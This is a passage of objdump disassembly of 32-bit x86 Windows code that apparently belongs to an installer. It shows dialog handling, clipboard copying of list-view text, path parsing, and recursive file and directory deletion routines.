  4057d0:	6a 08                	push   $0x8
  4057d2:	ff 75 fc             	push   -0x4(%ebp)
  4057d5:	ff 15 14 82 40 00    	call   *0x408214
  4057db:	eb 06                	jmp    0x4057e3
  4057dd:	89 1d 30 3b 42 00    	mov    %ebx,0x423b30
  4057e3:	ff 35 28 3b 42 00    	push   0x423b28
  4057e9:	e8 ec ec ff ff       	call   0x4044da
  4057ee:	68 ec 03 00 00       	push   $0x3ec
  4057f3:	ff 75 08             	push   0x8(%ebp)
  4057f6:	ff d7                	call   *%edi
  4057f8:	68 00 00 30 75       	push   $0x75300000
  4057fd:	8b f8                	mov    %eax,%edi
  4057ff:	53                   	push   %ebx
  405800:	68 01 04 00 00       	push   $0x401
  405805:	57                   	push   %edi
  405806:	ff d6                	call   *%esi
  405808:	f6 05 78 43 42 00 04 	testb  $0x4,0x424378
  40580f:	0f 84 f3 01 00 00    	je     0x405a08
  405815:	ff 75 0c             	push   0xc(%ebp)
  405818:	53                   	push   %ebx
  405819:	68 09 04 00 00       	push   $0x409
  40581e:	57                   	push   %edi
  40581f:	ff d6                	call   *%esi
  405821:	ff 75 10             	push   0x10(%ebp)
  405824:	53                   	push   %ebx
  405825:	68 01 20 00 00       	push   $0x2001
  40582a:	57                   	push   %edi
  40582b:	ff d6                	call   *%esi
  40582d:	e9 d6 01 00 00       	jmp    0x405a08
  405832:	81 ff 05 04 00 00    	cmp    $0x405,%edi
  405838:	75 28                	jne    0x405862
  40583a:	8d 45 0c             	lea    0xc(%ebp),%eax
  40583d:	50                   	push   %eax
  40583e:	53                   	push   %ebx
  40583f:	68 ec 03 00 00       	push   $0x3ec
  405844:	ff 75 08             	push   0x8(%ebp)
  405847:	ff 15 28 82 40 00    	call   *0x408228
  40584d:	50                   	push   %eax
  40584e:	68 1b 56 40 00       	push   $0x40561b
  405853:	53                   	push   %ebx
  405854:	53                   	push   %ebx
  405855:	ff 15 7c 80 40 00    	call   *0x40807c
  40585b:	50                   	push   %eax
  40585c:	ff 15 f8 80 40 00    	call   *0x4080f8
  405862:	8b 35 14 82 40 00    	mov    0x408214,%esi
  405868:	81 ff 11 01 00 00    	cmp    $0x111,%edi
  40586e:	75 20                	jne    0x405890
  405870:	66 81 7d 10 03 04    	cmpw   $0x403,0x10(%ebp)
  405876:	75 39                	jne    0x4058b1
  405878:	53                   	push   %ebx
  405879:	ff 35 30 3b 42 00    	push   0x423b30
  40587f:	ff d6                	call   *%esi
  405881:	6a 08                	push   $0x8
  405883:	ff 75 fc             	push   -0x4(%ebp)
  405886:	ff d6                	call   *%esi
  405888:	ff 75 fc             	push   -0x4(%ebp)
  40588b:	e8 4a ec ff ff       	call   0x4044da
  405890:	81 ff 04 04 00 00    	cmp    $0x404,%edi
  405896:	75 53                	jne    0x4058eb
  405898:	39 1d 2c 3b 42 00    	cmp    %ebx,0x423b2c
  40589e:	74 24                	je     0x4058c4
  4058a0:	6a 78                	push   $0x78
  4058a2:	c7 05 28 fd 41 00 02 	movl   $0x2,0x41fd28
  4058a9:	00 00 00 
  4058ac:	e8 cd eb ff ff       	call   0x40447e
  4058b1:	ff 75 14             	push   0x14(%ebp)
  4058b4:	ff 75 10             	push   0x10(%ebp)
  4058b7:	57                   	push   %edi
  4058b8:	e8 4f ec ff ff       	call   0x40450c
  4058bd:	5f                   	pop    %edi
  4058be:	5e                   	pop    %esi
  4058bf:	5b                   	pop    %ebx
  4058c0:	c9                   	leave
  4058c1:	c2 10 00             	ret    $0x10
  4058c4:	6a 08                	push   $0x8
  4058c6:	ff 35 68 43 42 00    	push   0x424368
  4058cc:	ff d6                	call   *%esi
  4058ce:	39 1d ec 43 42 00    	cmp    %ebx,0x4243ec
  4058d4:	75 0e                	jne    0x4058e4
  4058d6:	a1 30 01 42 00       	mov    0x420130,%eax
  4058db:	53                   	push   %ebx
  4058dc:	ff 70 34             	push   0x34(%eax)
  4058df:	e8 65 fc ff ff       	call   0x405549
  4058e4:	6a 01                	push   $0x1
  4058e6:	e8 93 eb ff ff       	call   0x40447e
  4058eb:	83 ff 7b             	cmp    $0x7b,%edi
  4058ee:	75 c1                	jne    0x4058b1
  4058f0:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4058f3:	39 45 10             	cmp    %eax,0x10(%ebp)
  4058f6:	75 b9                	jne    0x4058b1
  4058f8:	53                   	push   %ebx
  4058f9:	53                   	push   %ebx
  4058fa:	68 04 10 00 00       	push   $0x1004
  4058ff:	50                   	push   %eax
  405900:	ff 15 44 82 40 00    	call   *0x408244
  405906:	3b c3                	cmp    %ebx,%eax
  405908:	89 45 10             	mov    %eax,0x10(%ebp)
  40590b:	0f 8e f7 00 00 00    	jle    0x405a08
  405911:	ff 15 88 81 40 00    	call   *0x408188
  405917:	6a e1                	push   $0xffffffe1
  405919:	53                   	push   %ebx
  40591a:	8b f0                	mov    %eax,%esi
  40591c:	e8 77 0b 00 00       	call   0x406498
  405921:	50                   	push   %eax
  405922:	6a 01                	push   $0x1
  405924:	53                   	push   %ebx
  405925:	56                   	push   %esi
  405926:	ff 15 8c 81 40 00    	call   *0x40818c
  40592c:	8b 4d 14             	mov    0x14(%ebp),%ecx
  40592f:	0f bf 45 14          	movswl 0x14(%ebp),%eax
  405933:	c1 e9 10             	shr    $0x10,%ecx
  405936:	83 7d 14 ff          	cmpl   $0xffffffff,0x14(%ebp)
  40593a:	0f bf c9             	movswl %cx,%ecx
  40593d:	75 13                	jne    0x405952
  40593f:	8d 45 ec             	lea    -0x14(%ebp),%eax
  405942:	50                   	push   %eax
  405943:	ff 75 fc             	push   -0x4(%ebp)
  405946:	ff 15 d4 81 40 00    	call   *0x4081d4
  40594c:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40594f:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  405952:	53                   	push   %ebx
  405953:	ff 75 08             	push   0x8(%ebp)
  405956:	53                   	push   %ebx
  405957:	51                   	push   %ecx
  405958:	50                   	push   %eax
  405959:	68 80 01 00 00       	push   $0x180
  40595e:	56                   	push   %esi
  40595f:	ff 15 74 82 40 00    	call   *0x408274
  405965:	83 f8 01             	cmp    $0x1,%eax
  405968:	0f 85 9a 00 00 00    	jne    0x405a08
  40596e:	8b 45 10             	mov    0x10(%ebp),%eax
  405971:	33 f6                	xor    %esi,%esi
  405973:	46                   	inc    %esi
  405974:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  405977:	c7 45 d8 58 09 42 00 	movl   $0x420958,-0x28(%ebp)
  40597e:	c7 45 dc 00 10 00 00 	movl   $0x1000,-0x24(%ebp)
  405985:	89 45 08             	mov    %eax,0x8(%ebp)
  405988:	bf 2d 10 00 00       	mov    $0x102d,%edi
  40598d:	ff 4d 08             	decl   0x8(%ebp)
  405990:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  405993:	50                   	push   %eax
  405994:	ff 75 08             	push   0x8(%ebp)
  405997:	57                   	push   %edi
  405998:	ff 75 fc             	push   -0x4(%ebp)
  40599b:	ff 15 44 82 40 00    	call   *0x408244
  4059a1:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4059a4:	8d 74 06 02          	lea    0x2(%esi,%eax,1),%esi
  4059a8:	75 e3                	jne    0x40598d
  4059aa:	53                   	push   %ebx
  4059ab:	ff 15 90 81 40 00    	call   *0x408190
  4059b1:	ff 15 94 81 40 00    	call   *0x408194
  4059b7:	56                   	push   %esi
  4059b8:	6a 42                	push   $0x42
  4059ba:	ff 15 0c 81 40 00    	call   *0x40810c
  4059c0:	50                   	push   %eax
  4059c1:	89 45 08             	mov    %eax,0x8(%ebp)
  4059c4:	ff 15 80 80 40 00    	call   *0x408080
  4059ca:	8b f0                	mov    %eax,%esi
  4059cc:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  4059cf:	89 75 d8             	mov    %esi,-0x28(%ebp)
  4059d2:	50                   	push   %eax
  4059d3:	53                   	push   %ebx
  4059d4:	57                   	push   %edi
  4059d5:	ff 75 fc             	push   -0x4(%ebp)
  4059d8:	ff 15 44 82 40 00    	call   *0x408244
  4059de:	03 f0                	add    %eax,%esi
  4059e0:	c6 06 0d             	movb   $0xd,(%esi)
  4059e3:	46                   	inc    %esi
  4059e4:	c6 06 0a             	movb   $0xa,(%esi)
  4059e7:	46                   	inc    %esi
  4059e8:	43                   	inc    %ebx
  4059e9:	3b 5d 10             	cmp    0x10(%ebp),%ebx
  4059ec:	7c de                	jl     0x4059cc
  4059ee:	ff 75 08             	push   0x8(%ebp)
  4059f1:	ff 15 84 80 40 00    	call   *0x408084
  4059f7:	ff 75 08             	push   0x8(%ebp)
  4059fa:	6a 01                	push   $0x1
  4059fc:	ff 15 98 81 40 00    	call   *0x408198
  405a02:	ff 15 9c 81 40 00    	call   *0x40819c
  405a08:	33 c0                	xor    %eax,%eax
  405a0a:	e9 ae fe ff ff       	jmp    0x4058bd
  405a0f:	55                   	push   %ebp
  405a10:	8b ec                	mov    %esp,%ebp
  405a12:	83 ec 20             	sub    $0x20,%esp
  405a15:	b8 7c 83 40 00       	mov    $0x40837c,%eax
  405a1a:	80 65 e1 00          	andb   $0x0,-0x1f(%ebp)
  405a1e:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  405a21:	89 45 e8             	mov    %eax,-0x18(%ebp)
  405a24:	8d 45 e0             	lea    -0x20(%ebp),%eax
  405a27:	83 65 ec 00          	andl   $0x0,-0x14(%ebp)
  405a2b:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  405a2f:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405a32:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405a35:	c6 45 e0 01          	movb   $0x1,-0x20(%ebp)
  405a39:	50                   	push   %eax
  405a3a:	66 c7 45 e2 04 00    	movw   $0x4,-0x1e(%ebp)
  405a40:	ff 75 08             	push   0x8(%ebp)
  405a43:	c7 45 f0 6c 83 40 00 	movl   $0x40836c,-0x10(%ebp)
  405a4a:	c7 45 f4 0c 00 00 00 	movl   $0xc,-0xc(%ebp)
  405a51:	ff 15 78 80 40 00    	call   *0x408078
  405a57:	85 c0                	test   %eax,%eax
  405a59:	74 04                	je     0x405a5f
  405a5b:	33 c0                	xor    %eax,%eax
  405a5d:	eb 06                	jmp    0x405a65
  405a5f:	ff 15 c0 80 40 00    	call   *0x4080c0
  405a65:	c9                   	leave
  405a66:	c2 04 00             	ret    $0x4
  405a69:	6a 00                	push   $0x0
  405a6b:	ff 74 24 08          	push   0x8(%esp)
  405a6f:	ff 15 78 80 40 00    	call   *0x408078
  405a75:	85 c0                	test   %eax,%eax
  405a77:	74 04                	je     0x405a7d
  405a79:	33 c0                	xor    %eax,%eax
  405a7b:	eb 06                	jmp    0x405a83
  405a7d:	ff 15 c0 80 40 00    	call   *0x4080c0
  405a83:	c2 04 00             	ret    $0x4
  405a86:	6a 06                	push   $0x6
  405a88:	e8 a0 0d 00 00       	call   0x40682d
  405a8d:	85 c0                	test   %eax,%eax
  405a8f:	74 0a                	je     0x405a9b
  405a91:	ff d0                	call   *%eax
  405a93:	85 c0                	test   %eax,%eax
  405a95:	74 04                	je     0x405a9b
  405a97:	33 c0                	xor    %eax,%eax
  405a99:	40                   	inc    %eax
  405a9a:	c3                   	ret
  405a9b:	33 c0                	xor    %eax,%eax
  405a9d:	c3                   	ret
  405a9e:	55                   	push   %ebp
  405a9f:	8b ec                	mov    %esp,%ebp
  405aa1:	83 ec 10             	sub    $0x10,%esp
  405aa4:	8d 45 f0             	lea    -0x10(%ebp),%eax
  405aa7:	c7 05 60 21 42 00 44 	movl   $0x44,0x422160
  405aae:	00 00 00 
  405ab1:	50                   	push   %eax
  405ab2:	33 c0                	xor    %eax,%eax
  405ab4:	68 60 21 42 00       	push   $0x422160
  405ab9:	50                   	push   %eax
  405aba:	50                   	push   %eax
  405abb:	68 00 00 00 04       	push   $0x4000000
  405ac0:	50                   	push   %eax
  405ac1:	50                   	push   %eax
  405ac2:	50                   	push   %eax
  405ac3:	ff 75 08             	push   0x8(%ebp)
  405ac6:	50                   	push   %eax
  405ac7:	ff 15 6c 80 40 00    	call   *0x40806c
  405acd:	85 c0                	test   %eax,%eax
  405acf:	74 0c                	je     0x405add
  405ad1:	ff 75 f4             	push   -0xc(%ebp)
  405ad4:	ff 15 f8 80 40 00    	call   *0x4080f8
  405ada:	8b 45 f0             	mov    -0x10(%ebp),%eax
  405add:	c9                   	leave
  405ade:	c2 04 00             	ret    $0x4
  405ae1:	8b 44 24 04          	mov    0x4(%esp),%eax
  405ae5:	50                   	push   %eax
  405ae6:	83 60 24 00          	andl   $0x0,0x24(%eax)
  405aea:	c7 00 3c 00 00 00    	movl   $0x3c,(%eax)
  405af0:	ff 15 78 81 40 00    	call   *0x408178
  405af6:	c2 04 00             	ret    $0x4
  405af9:	ff 25 80 81 40 00    	jmp    *0x408180
  405aff:	68 00 04 00 00       	push   $0x400
  405b04:	ff 74 24 0c          	push   0xc(%esp)
  405b08:	ff 74 24 0c          	push   0xc(%esp)
  405b0c:	ff 35 38 3b 42 00    	push   0x423b38
  405b12:	ff 15 ec 81 40 00    	call   *0x4081ec
  405b18:	c2 08 00             	ret    $0x8
  405b1b:	8b 44 24 08          	mov    0x8(%esp),%eax
  405b1f:	8b c8                	mov    %eax,%ecx
  405b21:	81 e1 ff ff 1f 00    	and    $0x1fffff,%ecx
  405b27:	83 3d 00 44 42 00 00 	cmpl   $0x0,0x424400
  405b2e:	74 05                	je     0x405b35
  405b30:	c1 e8 15             	shr    $0x15,%eax
  405b33:	75 47                	jne    0x405b7c
  405b35:	83 3d 08 44 42 00 00 	cmpl   $0x0,0x424408
  405b3c:	74 06                	je     0x405b44
  405b3e:	81 f1 00 00 18 00    	xor    $0x180000,%ecx
  405b44:	a1 68 43 42 00       	mov    0x424368,%eax
  405b49:	68 28 a2 40 00       	push   $0x40a228
  405b4e:	a3 2c a2 40 00       	mov    %eax,0x40a22c
  405b53:	a1 60 43 42 00       	mov    0x424360,%eax
  405b58:	a3 30 a2 40 00       	mov    %eax,0x40a230
  405b5d:	8b 44 24 08          	mov    0x8(%esp),%eax
  405b61:	a3 34 a2 40 00       	mov    %eax,0x40a234
  405b66:	c7 05 38 a2 40 00 60 	movl   $0x423b60,0x40a238
  405b6d:	3b 42 00 
  405b70:	89 0d 3c a2 40 00    	mov    %ecx,0x40a23c
  405b76:	ff 15 60 82 40 00    	call   *0x408260
  405b7c:	c2 08 00             	ret    $0x8
  405b7f:	56                   	push   %esi
  405b80:	8b 74 24 08          	mov    0x8(%esp),%esi
  405b84:	57                   	push   %edi
  405b85:	56                   	push   %esi
  405b86:	e8 e8 03 00 00       	call   0x405f73
  405b8b:	8b f8                	mov    %eax,%edi
  405b8d:	83 ff ff             	cmp    $0xffffffff,%edi
  405b90:	74 2e                	je     0x405bc0
  405b92:	f6 44 24 10 01       	testb  $0x1,0x10(%esp)
  405b97:	56                   	push   %esi
  405b98:	74 08                	je     0x405ba2
  405b9a:	ff 15 70 80 40 00    	call   *0x408070
  405ba0:	eb 06                	jmp    0x405ba8
  405ba2:	ff 15 38 81 40 00    	call   *0x408138
  405ba8:	85 c0                	test   %eax,%eax
  405baa:	74 05                	je     0x405bb1
  405bac:	33 c0                	xor    %eax,%eax
  405bae:	40                   	inc    %eax
  405baf:	eb 11                	jmp    0x405bc2
  405bb1:	f6 44 24 10 04       	testb  $0x4,0x10(%esp)
  405bb6:	75 08                	jne    0x405bc0
  405bb8:	57                   	push   %edi
  405bb9:	56                   	push   %esi
  405bba:	ff 15 d4 80 40 00    	call   *0x4080d4
  405bc0:	33 c0                	xor    %eax,%eax
  405bc2:	5f                   	pop    %edi
  405bc3:	5e                   	pop    %esi
  405bc4:	c2 08 00             	ret    $0x8
  405bc7:	55                   	push   %ebp
  405bc8:	8b ec                	mov    %esp,%ebp
  405bca:	81 ec 4c 01 00 00    	sub    $0x14c,%esp
  405bd0:	53                   	push   %ebx
  405bd1:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  405bd4:	56                   	push   %esi
  405bd5:	57                   	push   %edi
  405bd6:	8b 7d 08             	mov    0x8(%ebp),%edi
  405bd9:	8b c3                	mov    %ebx,%eax
  405bdb:	83 e0 04             	and    $0x4,%eax
  405bde:	57                   	push   %edi
  405bdf:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405be2:	e8 9e 02 00 00       	call   0x405e85
  405be7:	f6 c3 08             	test   $0x8,%bl
  405bea:	89 45 f4             	mov    %eax,-0xc(%ebp)
  405bed:	74 17                	je     0x405c06
  405bef:	57                   	push   %edi
  405bf0:	ff 15 38 81 40 00    	call   *0x408138
  405bf6:	f7 d8                	neg    %eax
  405bf8:	1b c0                	sbb    %eax,%eax
  405bfa:	40                   	inc    %eax
  405bfb:	01 05 e8 43 42 00    	add    %eax,0x4243e8
  405c01:	e9 8a 01 00 00       	jmp    0x405d90
  405c06:	89 5d 08             	mov    %ebx,0x8(%ebp)
  405c09:	83 65 08 01          	andl   $0x1,0x8(%ebp)
  405c0d:	74 11                	je     0x405c20
  405c0f:	85 c0                	test   %eax,%eax
  405c11:	0f 84 27 01 00 00    	je     0x405d3e
  405c17:	f6 c3 02             	test   $0x2,%bl
  405c1a:	0f 84 1e 01 00 00    	je     0x405d3e
  405c20:	be 60 19 42 00       	mov    $0x421960,%esi
  405c25:	57                   	push   %edi
  405c26:	56                   	push   %esi
  405c27:	e8 d9 07 00 00       	call   0x406405
  405c2c:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  405c30:	74 0d                	je     0x405c3f
  405c32:	68 e4 a3 40 00       	push   $0x40a3e4
  405c37:	56                   	push   %esi
  405c38:	e8 e4 07 00 00       	call   0x406421
  405c3d:	eb 06                	jmp    0x405c45
  405c3f:	57                   	push   %edi
  405c40:	e8 99 01 00 00       	call   0x405dde
  405c45:	80 3f 00             	cmpb   $0x0,(%edi)
  405c48:	75 09                	jne    0x405c53
  405c4a:	80 3d 60 19 42 00 5c 	cmpb   $0x5c,0x421960
  405c51:	75 0b                	jne    0x405c5e
  405c53:	68 14 a0 40 00       	push   $0x40a014
  405c58:	57                   	push   %edi
  405c59:	e8 c3 07 00 00       	call   0x406421
  405c5e:	57                   	push   %edi
  405c5f:	e8 b7 07 00 00       	call   0x40641b
  405c64:	8b d8                	mov    %eax,%ebx
  405c66:	8d 85 b4 fe ff ff    	lea    -0x14c(%ebp),%eax
  405c6c:	50                   	push   %eax
  405c6d:	56                   	push   %esi
  405c6e:	03 df                	add    %edi,%ebx
  405c70:	ff 15 34 81 40 00    	call   *0x408134
  405c76:	83 f8 ff             	cmp    $0xffffffff,%eax
  405c79:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405c7c:	0f 84 b2 00 00 00    	je     0x405d34
  405c82:	8d 85 e0 fe ff ff    	lea    -0x120(%ebp),%eax
  405c88:	6a 3f                	push   $0x3f
  405c8a:	50                   	push   %eax
  405c8b:	8d b5 e0 fe ff ff    	lea    -0x120(%ebp),%esi
  405c91:	e8 2c 01 00 00       	call   0x405dc2
  405c96:	80 38 00             	cmpb   $0x0,(%eax)
  405c99:	74 09                	je     0x405ca4
  405c9b:	80 7d e4 00          	cmpb   $0x0,-0x1c(%ebp)
  405c9f:	74 03                	je     0x405ca4
  405ca1:	8d 75 e4             	lea    -0x1c(%ebp),%esi
  405ca4:	80 3e 2e             	cmpb   $0x2e,(%esi)
  405ca7:	75 11                	jne    0x405cba
  405ca9:	8a 46 01             	mov    0x1(%esi),%al
  405cac:	84 c0                	test   %al,%al
  405cae:	74 63                	je     0x405d13
  405cb0:	3c 2e                	cmp    $0x2e,%al
  405cb2:	75 06                	jne    0x405cba
  405cb4:	80 7e 02 00          	cmpb   $0x0,0x2(%esi)
  405cb8:	74 59                	je     0x405d13
  405cba:	56                   	push   %esi
  405cbb:	53                   	push   %ebx
  405cbc:	e8 44 07 00 00       	call   0x406405
  405cc1:	f6 85 b4 fe ff ff 10 	testb  $0x10,-0x14c(%ebp)
  405cc8:	74 15                	je     0x405cdf
  405cca:	8b 45 0c             	mov    0xc(%ebp),%eax
  405ccd:	83 e0 03             	and    $0x3,%eax
  405cd0:	3c 03                	cmp    $0x3,%al
  405cd2:	75 3f                	jne    0x405d13
  405cd4:	ff 75 0c             	push   0xc(%ebp)
  405cd7:	57                   	push   %edi
  405cd8:	e8 ea fe ff ff       	call   0x405bc7
  405cdd:	eb 34                	jmp    0x405d13
  405cdf:	ff 75 fc             	push   -0x4(%ebp)
  405ce2:	57                   	push   %edi
  405ce3:	e8 97 fe ff ff       	call   0x405b7f
  405ce8:	85 c0                	test   %eax,%eax
  405cea:	75 1f                	jne    0x405d0b
  405cec:	39 45 fc             	cmp    %eax,-0x4(%ebp)
  405cef:	74 12                	je     0x405d03
  405cf1:	57                   	push   %edi
  405cf2:	6a f1                	push   $0xfffffff1
  405cf4:	e8 50 f8 ff ff       	call   0x405549
  405cf9:	6a 00                	push   $0x0
  405cfb:	57                   	push   %edi
  405cfc:	e8 dd 04 00 00       	call   0x4061de
  405d01:	eb 10                	jmp    0x405d13
  405d03:	ff 05 e8 43 42 00    	incl   0x4243e8
  405d09:	eb 08                	jmp    0x405d13
  405d0b:	57                   	push   %edi
  405d0c:	6a f2                	push   $0xfffffff2
  405d0e:	e8 36 f8 ff ff       	call   0x405549
  405d13:	8d 85 b4 fe ff ff    	lea    -0x14c(%ebp),%eax
  405d19:	50                   	push   %eax
  405d1a:	ff 75 f8             	push   -0x8(%ebp)
  405d1d:	ff 15 30 81 40 00    	call   *0x408130
  405d23:	85 c0                	test   %eax,%eax
  405d25:	0f 85 57 ff ff ff    	jne    0x405c82
  405d2b:	ff 75 f8             	push   -0x8(%ebp)
  405d2e:	ff 15 2c 81 40 00    	call   *0x40812c
  405d34:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  405d38:	74 04                	je     0x405d3e
  405d3a:	80 63 ff 00          	andb   $0x0,-0x1(%ebx)
  405d3e:	33 f6                	xor    %esi,%esi
  405d40:	39 75 08             	cmp    %esi,0x8(%ebp)
  405d43:	74 4b                	je     0x405d90
  405d45:	39 75 f4             	cmp    %esi,-0xc(%ebp)
  405d48:	75 08                	jne    0x405d52
  405d4a:	ff 05 e8 43 42 00    	incl   0x4243e8
  405d50:	eb 3e                	jmp    0x405d90
  405d52:	57                   	push   %edi
  405d53:	e8 40 0a 00 00       	call   0x406798
  405d58:	85 c0                	test   %eax,%eax
  405d5a:	74 34                	je     0x405d90
  405d5c:	57                   	push   %edi
  405d5d:	e8 35 00 00 00       	call   0x405d97
  405d62:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405d65:	0c 01                	or     $0x1,%al
  405d67:	50                   	push   %eax
  405d68:	57                   	push   %edi
  405d69:	e8 11 fe ff ff       	call   0x405b7f
  405d6e:	85 c0                	test   %eax,%eax
  405d70:	75 16                	jne    0x405d88
  405d72:	39 75 fc             	cmp    %esi,-0x4(%ebp)
  405d75:	74 d3                	je     0x405d4a
  405d77:	57                   	push   %edi
  405d78:	6a f1                	push   $0xfffffff1
  405d7a:	e8 ca f7 ff ff       	call   0x405549
  405d7f:	56                   	push   %esi
  405d80:	57                   	push   %edi
  405d81:	e8 58 04 00 00       	call   0x4061de
  405d86:	eb 08                	jmp    0x405d90
  405d88:	57                   	push   %edi
  405d89:	6a e5                	push   $0xffffffe5
  405d8b:	e8 b9 f7 ff ff       	call   0x405549
  405d90:	5f                   	pop    %edi
  405d91:	5e                   	pop    %esi
  405d92:	5b                   	pop    %ebx
  405d93:	c9                   	leave
  405d94:	c2 08 00             	ret    $0x8
  405d97:	56                   	push   %esi
  405d98:	8b 74 24 08          	mov    0x8(%esp),%esi
  405d9c:	56                   	push   %esi
  405d9d:	e8 79 06 00 00       	call   0x40641b
  405da2:	03 c6                	add    %esi,%eax
  405da4:	50                   	push   %eax
  405da5:	56                   	push   %esi
  405da6:	ff 15 64 82 40 00    	call   *0x408264
  405dac:	80 38 5c             	cmpb   $0x5c,(%eax)
  405daf:	74 0b                	je     0x405dbc
  405db1:	68 14 a0 40 00       	push   $0x40a014
  405db6:	56                   	push   %esi
  405db7:	e8 65 06 00 00       	call   0x406421
  405dbc:	8b c6                	mov    %esi,%eax
  405dbe:	5e                   	pop    %esi
  405dbf:	c2 04 00             	ret    $0x4
  405dc2:	8b 44 24 04          	mov    0x4(%esp),%eax
  405dc6:	eb 0d                	jmp    0x405dd5
  405dc8:	3a 4c 24 08          	cmp    0x8(%esp),%cl
  405dcc:	74 0d                	je     0x405ddb
  405dce:	50                   	push   %eax
  405dcf:	ff 15 f4 81 40 00    	call   *0x4081f4
  405dd5:	8a 08                	mov    (%eax),%cl
  405dd7:	84 c9                	test   %cl,%cl
  405dd9:	75 ed                	jne    0x405dc8
  405ddb:	c2 08 00             	ret    $0x8
  405dde:	56                   	push   %esi
  405ddf:	8b 74 24 08          	mov    0x8(%esp),%esi
  405de3:	56                   	push   %esi
  405de4:	e8 32 06 00 00       	call   0x40641b
  405de9:	03 c6                	add    %esi,%eax
  405deb:	80 38 5c             	cmpb   $0x5c,(%eax)
  405dee:	74 0c                	je     0x405dfc
  405df0:	50                   	push   %eax
  405df1:	56                   	push   %esi
  405df2:	ff 15 64 82 40 00    	call   *0x408264
  405df8:	3b c6                	cmp    %esi,%eax
  405dfa:	77 ef                	ja     0x405deb
  405dfc:	80 20 00             	andb   $0x0,(%eax)
  405dff:	40                   	inc    %eax
  405e00:	5e                   	pop    %esi
  405e01:	c2 04 00             	ret    $0x4
  405e04:	8b 54 24 04          	mov    0x4(%esp),%edx
  405e08:	8a 0a                	mov    (%edx),%cl
  405e0a:	8a c1                	mov    %cl,%al
  405e0c:	0c 20                	or     $0x20,%al
  405e0e:	80 f9 5c             	cmp    $0x5c,%cl
  405e11:	75 05                	jne    0x405e18
  405e13:	38 4a 01             	cmp    %cl,0x1(%edx)
  405e16:	74 0e                	je     0x405e26
  405e18:	3c 61                	cmp    $0x61,%al
  405e1a:	7c 0f                	jl     0x405e2b
  405e1c:	3c 7a                	cmp    $0x7a,%al
  405e1e:	7f 0b                	jg     0x405e2b
  405e20:	80 7a 01 3a          	cmpb   $0x3a,0x1(%edx)
  405e24:	75 05                	jne    0x405e2b
  405e26:	33 c0                	xor    %eax,%eax
  405e28:	40                   	inc    %eax
  405e29:	eb 02                	jmp    0x405e2d
  405e2b:	33 c0                	xor    %eax,%eax
  405e2d:	c2 04 00             	ret    $0x4
  405e30:	53                   	push   %ebx
  405e31:	56                   	push   %esi
  405e32:	8b 35 f4 81 40 00    	mov    0x4081f4,%esi
  405e38:	57                   	push   %edi
  405e39:	8b 7c 24 10          	mov    0x10(%esp),%edi
  405e3d:	57                   	push   %edi
  405e3e:	ff d6                	call   *%esi
  405e40:	8b d8                	mov    %eax,%ebx
  405e42:	53                   	push   %ebx
  405e43:	ff d6                	call   *%esi
  405e45:	8a 0f                	mov    (%edi),%cl
  405e47:	84 c9                	test   %cl,%cl
  405e49:	74 10                	je     0x405e5b
  405e4b:	80 3b 3a             	cmpb   $0x3a,(%ebx)
  405e4e:	75 0b                	jne    0x405e5b
  405e50:	80 7b 01 5c          	cmpb   $0x5c,0x1(%ebx)
  405e54:	75 05                	jne    0x405e5b
  405e56:	50                   	push   %eax
  405e57:	ff d6                	call   *%esi
  405e59:	eb 24                	jmp    0x405e7f
  405e5b:	80 f9 5c             	cmp    $0x5c,%cl
  405e5e:	75 1d                	jne    0x405e7d
  405e60:	38 4f 01             	cmp    %cl,0x1(%edi)
  405e63:	75 18                	jne    0x405e7d
  405e65:	6a 02                	push   $0x2
  405e67:	5e                   	pop    %esi
  405e68:	6a 5c                	push   $0x5c
  405e6a:	50                   	push   %eax
  405e6b:	4e                   	dec    %esi
  405e6c:	e8 51 ff ff ff       	call   0x405dc2
  405e71:	80 38 00             	cmpb   $0x0,(%eax)
  405e74:	74 07                	je     0x405e7d
  405e76:	40                   	inc    %eax
  405e77:	85 f6                	test   %esi,%esi
  405e79:	75 ed                	jne    0x405e68
  405e7b:	eb 02                	jmp    0x405e7f
  405e7d:	33 c0                	xor    %eax,%eax
  405e7f:	5f                   	pop    %edi
  405e80:	5e                   	pop    %esi
  405e81:	5b                   	pop    %ebx
  405e82:	c2 04 00             	ret    $0x4
  405e85:	56                   	push   %esi
  405e86:	57                   	push   %edi
  405e87:	ff 74 24 0c          	push   0xc(%esp)
  405e8b:	be 60 1d 42 00       	mov    $0x421d60,%esi
  405e90:	56                   	push   %esi
  405e91:	e8 6f 05 00 00       	call   0x406405
  405e96:	56                   	push   %esi
  405e97:	e8 94 ff ff ff       	call   0x405e30
  405e9c:	8b f8                	mov    %eax,%edi
  405e9e:	85 ff                	test   %edi,%edi
  405ea0:	75 04                	jne    0x405ea6
  405ea2:	33 c0                	xor    %eax,%eax
  405ea4:	eb 52                	jmp    0x405ef8
  405ea6:	57                   	push   %edi
  405ea7:	e8 53 08 00 00       	call   0x4066ff
  405eac:	f6 05 78 43 42 00 80 	testb  $0x80,0x424378
  405eb3:	74 0a                	je     0x405ebf
  405eb5:	8a 07                	mov    (%edi),%al
  405eb7:	84 c0                	test   %al,%al
  405eb9:	74 e7                	je     0x405ea2
  405ebb:	3c 5c                	cmp    $0x5c,%al
  405ebd:	74 e3                	je     0x405ea2
  405ebf:	2b fe                	sub    %esi,%edi
  405ec1:	eb 14                	jmp    0x405ed7
  405ec3:	e8 d0 08 00 00       	call   0x406798
  405ec8:	85 c0                	test   %eax,%eax
  405eca:	74 05                	je     0x405ed1
  405ecc:	f6 00 10             	testb  $0x10,(%eax)
  405ecf:	74 d1                	je     0x405ea2
  405ed1:	56                   	push   %esi
  405ed2:	e8 07 ff ff ff       	call   0x405dde
  405ed7:	56                   	push   %esi
